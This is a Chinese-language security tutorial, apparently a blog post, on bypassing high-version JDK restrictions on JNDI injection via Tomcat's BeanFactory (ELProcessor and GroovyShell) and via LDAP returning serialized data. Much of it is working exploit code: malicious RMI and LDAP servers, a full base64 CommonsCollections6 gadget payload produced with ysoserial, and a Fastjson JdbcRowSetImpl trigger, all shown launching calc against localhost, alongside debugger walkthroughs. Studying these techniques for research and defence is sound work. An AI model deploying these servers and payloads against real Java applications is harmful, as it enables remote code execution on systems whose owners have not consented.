## 前言

在JDK  6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

所以对于高版本的jdk我们又该如何绕过呢？

@KINGX师傅提到了两种主流的方法：

> 1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
> 2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。

这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。

## 1 加载本地类

需要注意的，该工厂类型必须实现`javax.naming.spi.ObjectFactory` 接口，因为在`javax.naming.spi.NamingManager#getObjectFactoryFromReference`最后的`return`语句对工厂类的实例对象进行了类型转换`return (clas != null) ? (ObjectFactory) clas.newInstance() : null;`；并且该工厂类至少存在一个 `getObjectInstance()` 方法。

我们知道，对象工厂需要实现`javax.naming.spi.ObjectFactory`接口的getObjectInstance方法，使用IDEA ctrl+H获取子类，`tomcat-catalina.jar`中`org.apache.naming.factory.BeanFactory`正好符合

### 基于BeanFactory

基于该工厂有两种方式，`javax.el.ELProcessor`和`Groovy.lang.GroovyShell`

EL和Groovy之所以能打是因为LDAP和RMI在收到服务端反序列化来的`Reference`对象后根据`classFactory`属性从本地classpath中实例化一个 ObjectFactory 对象，然后调用这个对象的 `getObjectInstance` 方法。

在Tomcat的`catalina.jar`中有一个`org.apache.naming.factory.BeanFactory`类，这个类会把`Reference`对象的`className`属性作为类名去调用无参构造方法实例化一个对象。然后再从`Reference`对象的Addrs参数集合中取得 AddrType 是 forceString 的 String 参数。

接着根据取到的 forceString 参数按照`,`逗号分割成多个要执行的方法。再按`=`等于号分割成 propName 和 param。

最后会根据 propName 作为方法名称去反射获取一个参数类型是 `String.class`的方法，并按照 param 从 Addrs 中取到的 String 对象作为参数去反射调用该方法。

而刚好`javax.el.ELProcessor#eval`和 `groovy.lang.GroovyShell#evaluate`这两个方法都是可以只传一个String参数就能够执行攻击代码，且依赖库比较常见所以被经常使用。

这里我们先弹个计算器：

首先需要添加依赖

```xml
<dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>8.5.3</version>
        </dependency>
<dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-el</artifactId>
            <version>8.5.3</version>
        </dependency>
<dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>1.5.0</version>
        </dependency>
```

#### javax.el.ELProcessor#eval

服务端

```java
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry( 1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        // ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

        System.out.println("[*]Evil command: calc");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("calc", referenceWrapper);
    }
}
```

客户端

```java
package JNDI;

import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1099/calc";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```

调试分析，我们直接在`org.apache.naming.factory.BeanFactory`类`getObjectInstance()`函数上打上断点debug，调用栈如下：

```
getObjectInstance:119, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:411, InitialContext (javax.naming)
main:10, JNDI_Test (JNDI)
```

`BeanFactory`类的引入是在`javax.naming.spi.NamingManager`

![image-20220714170614141](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714170614141.png)

这里用了`getObjectFactoryFromReference()`函数来从Reference中获取ObjectFactory类实例，跟进

![image-20220714171109604](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714171109604.png)

这里利用loadclass加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型

也就是说，**我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点**

继续往下看到`org.apache.naming.factory.BeanFactory`类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，**这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例**：

![image-20220714171935604](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714171935604.png)

接下来获取bean类为`javax.el.ELProcessor`并实例化，同时获取其中`forceString`的内容，也就是我们构造的`x=eval`

![image-20220714212312219](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714212312219.png)

继续往下调试，这里查找forceString的内容中是否存在`=`号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，**之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！**之后，就是获取beanClass即`javax.el.ELProcessor`类的eval()方法并和x属性一同缓存到forced这个HashMap中：

![image-20220714213203838](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714213203838.png)

之后利用do while循环来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素：

![image-20220714213819609](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714213819609.png)

获取恶意表达式之后从缓存中取出key为x的值，通过`method.invoke()`反射调用执行：

```java
new ELProcessor().eval("".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd', '/C', 'calc.exe']).start()"))：
```

小结一下几个关键点：

- 这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是`org.apache.naming.factory.BeanFactory`；
- 由于`org.apache.naming.factory.BeanFactory`类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的`javax.el.ELProcessor`类；
- ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为`forceString`、内容为`x=eval`的StringRefAddr类实例，这里看`org.apache.naming.factory.BeanFactory`类的getObjectInstance()方法源码发现，程序会判断是否存在`=`号，若存在则将`x`属性的默认setter方法设置为我们`eval`；第二次是类型为`x`、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的`x`属性关联起来，`x`属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用`javax.el.ELProcessor`类的eval()函数执行恶意表达式从而达到攻击利用的目的；

#### groovy.lang.GroovyShell#evaluate

客户端

```java
package JNDI;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class GroovyAllRMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("forceString", "a=evaluate"));

        resourceRef.add(new StringRefAddr("a", "'calc'.execute()"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.rebind("groovy", referenceWrapper);
        System.out.println("rmi://127.0.0.1:1099/groovy");
    }
}
```

整个流程相似就不再分析。

## 2 利用LDAP返回序列化数据，触发本地Gadget

高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类。此时，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。

LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的  javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject() `方法就会对这个字段的内容进行反序列化。

#### 攻击利用

假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。

使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出：

```
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections6 'calc' | base64
```

输出如下：

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=
```

恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据：

```java
package JNDI;


import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class SerializeLdapServer {
    public static void main(String[] args) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("127.0.0.1"),
                389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
        directoryServer.startListening();
        System.out.println("ldap://127.0.0.1:389 is working...");
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();

            Entry entry = new Entry(base);
            entry.addAttribute("javaClassName", "hahaha");

            try {
                entry.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv" +
                        "cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB" +
                        "H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4" +
                        "cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC" +
                        "nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z" +
                        "Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp" +
                        "bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv" +
                        "Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u" +
                        "cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl" +
                        "LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU" +
                        "AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz" +
                        "cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv" +
                        "cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h" +
                        "bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz" +
                        "O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1" +
                        "cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA" +
                        "AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA" +
                        "AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA" +
                        "AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA" +
                        "AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl" +
                        "chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB" +
                        "c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk" +
                        "eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
}
```

客户端

```java
package JNDI;

import com.alibaba.fastjson.JSON;
import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
        new InitialContext().lookup("ldap://127.0.0.1:389/a");

        // Fastjson反序列化JNDI注入Gadget触发
        // String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:389/a\",\"autoCommit\":\"true\" }";
        // JSON.parse(payload);
    }
}
```

调试分析

从lookup这个触发点来调试，直接在`com.sun.jndi.ldap.Obj`类的decodeObject()函数上打上断点，此时函数调用栈如下：

```
decodeObject:234, Obj (com.sun.jndi.ldap)
c_lookup:1052, LdapCtx (com.sun.jndi.ldap)
p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:411, InitialContext (javax.naming)
main:9, JNDI_Test (JNDI)
```

这里我们直接跟进`com.sun.jndi.ldap.Obj#decodeObject`

![image-20220714232513591](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714232513591.png)

此处`(var1 = var0.get(JAVA_ATTRIBUTES[1])) != null`判断`JAVA_ATTRIBUTES[1]`是否为空，如果不为空则进入`deserializeObject`进行反序列操作

看一下定义

```java
static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
```

`JAVA_ATTRIBUTES[1]`为`javaSerializedData`，所以我们可以LDAP修改`javaSerializedData`为我们的恶意序列化数据，然后客户端进行反序列化进而到达RCE。

跟进`com.sun.jndi.ldap.Obj#deserializeObject`，可以看到`var4 = ((ObjectInputStream)var13).readObject();`此处对`var13（也就是从javaSerializedData`中读取的序列化数据）进行了反序列化，由此触发漏洞。

接下来我们回到`decodeObject`函数调用的getURLClassLoader()函数中，这是之前使用LDAP+Reference的方式被高版本JDK限制无法利用的地方。

![image-20220714234619323](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220714234619323.png)

参数var1是javaCodeBase项设置的内容，由于未设置该项因此直接返回var2变量即AppClassLoader应用类加载器实例。这里看到，如果我们使用LDAP+Reference的方式进行利用的话，是需要设置javaCodeBase项的，此时var1就不为null、满足第一个判断条件，但是第二个条件`"true".equalsIgnoreCase(trustURLCodebase)`在高版本JDK中是默认不成立的，即trustURLCodebase值默认为false，因此之前的LDAP+Reference就不能利用了。





参考：

https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#0x02-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6

https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html

https://ho1aas.blog.csdn.net/article/details/123039821?spm=1001.2014.3001.5502

https://xz.aliyun.com/t/8214#toc-2
